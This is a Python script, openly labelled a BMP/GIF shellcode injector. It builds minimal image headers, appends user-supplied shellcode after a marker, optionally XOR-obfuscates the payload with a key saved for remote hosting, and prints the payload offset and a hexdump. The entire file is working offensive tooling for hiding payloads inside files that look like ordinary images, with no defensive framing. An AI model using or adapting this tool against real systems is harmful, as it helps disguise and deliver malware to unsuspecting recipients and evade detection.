#!/usr/bin/env python3

"""
References: https://github.com/chinarulezzz/pixload/blob/master/bmp.pl
            https://github.com/Urinx/SomeCodes/blob/master/Python/others/bmp-js-injector.py
            https://github.com/jhaddix/scripts/blob/master/gif_header_xss.py
"""

import os
import re
import sys
import string
import random
import base64
import hashlib
from argparse import ArgumentParser
from itertools import cycle


__version__ = '1.0'


# == Helper Functions == #

def xor_crypt(data, key):
    ''' XOR encode data passed in with a specified key '''
    return bytes([d^k for d,k in zip(data, cycle(key))])

def prompt(question):
    ''' Prompt the user with a y/n question '''
    reply = str(input(question + ' [Y/n]: ') or "Y").lower().strip()

    # Default to 'Yes'
    if reply[0] == 'y' or reply == '':
        return True

    elif reply[0] == 'n':
        return False

    else:
        return prompt("Please enter")

def hexdump(src, length=16, sep='.'):
    ''' Hexdump - taken from https://gist.github.com/7h3rAm/5603718 '''
    # Build a list of printable characters, otherwise set as '.'
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or sep for x in range(256)])

    # Iterate over the source data
    lines  = []
    for c in range(0, len(src), length):
        # Get slice from source data - 16-bytes at a time
        chars = src[c:c+length]

        # Convert the 16 byte chunk to a hex string
        hexstr = ' '.join(["%02x" % ord(x) for x in chars]) if type(chars) is str else ' '.join(['{:02x}'.format(x) for x in chars])

        if len(hexstr) > 24:
            hexstr = "%s %s" % (hexstr[:24], hexstr[24:])

        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or sep) for x in chars]) if type(chars) is str else ''.join(['{}'.format((x <= 127 and FILTER[x]) or sep) for x in chars])
        lines.append("%08x:  %-*s  |%s|" % (c, length*3, hexstr, printable))

    return '\n'.join(lines)


# == Image Functions == #

def gif_header_data():
    ''' Minimal GIF image data '''
    # GIF structure uses file terminator characters which allows
    # us to pack our shellcode in after the GIF file termination
    # without corrupting the image

    # Little-Endian
    # GIF Header (13 bytes)
    header  = b'\x47\x49\x46\x38\x39\x61'  # Signature and version  (GIF89a)
    header += b'\x0a\x00'                  # Logical Screen Width   (10 pixels)
    header += b'\x0a\x00'                  # Logical Screen Height  (10 pixels)
    header += b'\x00'                      # GCTF
    header += b'\xff'                      # Background Color       (#255)
    header += b'\x00'                      # Pixel Aspect Ratio

    # Global Color Table + Blocks (13 bytes)
    header += b'\x2c'                      # Image Descriptor
    header += b'\x00\x00\x00\x00'          # NW corner position of image in logical screen
    header += b'\x0a\x00\x0a\x00'          # Image width and height in pixels
    header += b'\x00'                      # No local color table
    header += b'\x02'                      # Start of image
    header += b'\x00'                      # End of image data
    header += b'\x3b'                      # GIF file terminator

    # Payload offset starts at: +31 (header bytes + enable script)

    return header


def bmp_header_data():
    ''' Minimal BMP image data '''
    # BMP structure uses explicit size values which allows
    # us to pack our shellcode in at the end of the image
    # file without corrupting the image

    # Little-Endian
    # BMP Header (14 bytes)
    header  = b'\x42\x4d'          # Magic bytes header       (`BM`)
    header += b'\x1e\x00\x00\x00'  # BMP file size            (30 bytes)
    header += b'\x00\x00'          # Reserved                 (Unused)
    header += b'\x00\x00'          # Reserved                 (Unused)
    header += b'\x1a\x00\x00\x00'  # BMP image data offset    (26 bytes)

    # DIB Header (12 bytes)
    header += b'\x0c\x00\x00\x00'  # DIB header size          (12 bytes)
    header += b'\x01\x00'          # Width of bitmap          (1 pixel)
    header += b'\x01\x00'          # Height of bitmap         (1 pixel)
    header += b'\x01\x00'          # Number of color planes   (1 plane)
    header += b'\x18\x00'          # Number of bits per pixel (24 bits)

    # BMP Image Pixel Array (4 bytes)
    header += b'\x00\x00\xff'      # Red, Pixel (0,1)
    header += b'\x00'              # Padding for 4 byte alignment

    # Payload offset starts at: +35 (header bytes + enable script)

    return header


def inject(payload, contents, out_file):
    '''Inject shellcode into BMP/GIF image

    Keyword arguments:
        payload  -- shellcode to inject into image
        contents -- image data
        out_file -- name of output image file
    '''

    # Open the image file
    f = open(out_file, "w+b")

    # Write the original image data
    f.write(contents)

    # Write `/////` as an offset identifier
    f.write(b'\x2f\x2f\x2f\x2f\x2f')

    # Write the payload
    f.write(payload)

    # Write a final `;` to break up shellcode from
    # just going to EOF
    f.write(b'\x3b')

    # Close the file
    f.close()

    print("[+]\tPayload was injected successfully")



if __name__ == '__main__':

    parser  = ArgumentParser(description='BMP/GIF Shellcode Injector -- v%s' % __version__)

    # Image type
    group_t = parser.add_mutually_exclusive_group(required=True)
    group_t.add_argument('-g', '--gif', action='store_true', help='Inject into GIF image file')
    group_t.add_argument('-b', '--bmp', action='store_true', help='Inject into BMP image file')

    # Shellcode input type
    group_s = parser.add_mutually_exclusive_group(required=True)
    group_s.add_argument('-s', '--shellcode', type=str, help='Explicit shellcode to inject into the image')
    group_s.add_argument('-f', '--file',      type=str, help='Payload file containing shellcode')

    # Encoding
    parser.add_argument('--encode',    action='store_true', help='Encode shellcode before injection')
    parser.add_argument('-k', '--key', type=str, help='Key to perform XOR encoding with')

    # Misc.
    parser.add_argument('-o', '--output', type=str, help='Output image file (Default: payload.{gif|bmp})', default='payload')
    parser.add_argument('--debug',  action='store_true', help='Enable debug output')
    args = parser.parse_args()


    # Print simple banner
    print("\n*** BMP/GIF Shellcode Injector ***")
    print("               v%s\n" % __version__)


    # -> Parse shellcode provided by the user

    if args.file:
        if not os.path.exists(args.file):
            print("[!]\tFile does not exist: %s" % args.file)
            sys.exit()

        print("[>]\tReading payload file into memory")
        with open(args.file, 'r+b') as f:
            shellcode = f.read()

    else:
        print("[>]\tStoring shellcode in memory")
        shellcode = args.shellcode.encode()

    if args.debug:
        print("[*]\tShellcode contents size: %d bytes" % len(shellcode))

    print("[>]\tSHA256 Hash of original payload: %s " % hashlib.sha256(shellcode).hexdigest())


    # -> Handle XOR encoding - when enabled

    if args.encode:
        if not args.key:
            print("[>]\tGenerating random XOR key")
            xor_key = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
            print("[>]\tXOR Key: %s" % xor_key)
        else:
            xor_key = args.key

        # Convert key to bytes
        xor_key = bytes([ord(c) for c in xor_key])

        print("[>]\tBase64 encoded key: %s" % base64.b64encode(xor_key).decode())

        # Store key in file for remote hosting
        print("[>]\tWriting Base64 encoded XOR key to file: image.key")
        with open('image.key', 'wb') as xor_file:
            xor_file.write(base64.b64encode(xor_key))

        print("[>]\tEncoding payload")
        shellcode = xor_crypt(shellcode, xor_key)


    # -> Collect image data

    print("[>]\tGetting image data")
    out_file = args.output

    # Make sure the output file has the correct image extension
    extension = 'bmp' if args.bmp else 'gif'
    if out_file[-4:] != ('.' + extension):
        out_file += ('.' + extension)

    # Check if image file exists
    # If not, use minimal image header data
    if not os.path.exists(out_file):
        contents = bmp_header_data() if args.bmp else gif_header_data()

    else:
        print("\n[!]\tThe file `%s` already exists." % out_file)
        append_sc = prompt("[?]\tAre you sure you want to append shellcode to the existing file?")
        print('')

        # Exit to avoid writing to file
        if not append_sc:
            sys.exit()

        # Append our shellcode to the existing image
        with open(out_file, 'r+b') as f:
            contents = f.read()

    original_length = len(contents)
    if args.debug:
        print("[*]\tOriginal image contents size: %d bytes" % original_length)


    # -> Inject our shellcode

    # Inject the shellcode into the BMP image
    print("[>]\tInjecting shellcode into image")
    inject(shellcode, contents, out_file)

    # Read the new data back in
    with open(out_file, 'r+b') as f:
        malicious_image = f.read()

    if args.debug:
        print("[*]\tMalicious image contents size: %d bytes" % len(malicious_image))


    # -> Calculate the offset of our shellcode

    new_bytes  = b'\x2f\x2f\x2f\x2f\x2f'
    byte_index = original_length + len(new_bytes)

    print("\n[+]\tIndex of payload: %d\n" % byte_index)


    # -> Hexdump based on content size

    if len(malicious_image) > 256:
        print(hexdump(malicious_image[0:128]))
        print('*')
        print(hexdump(malicious_image[byte_index-13:byte_index+128]))

    else:
        print(hexdump(malicious_image))
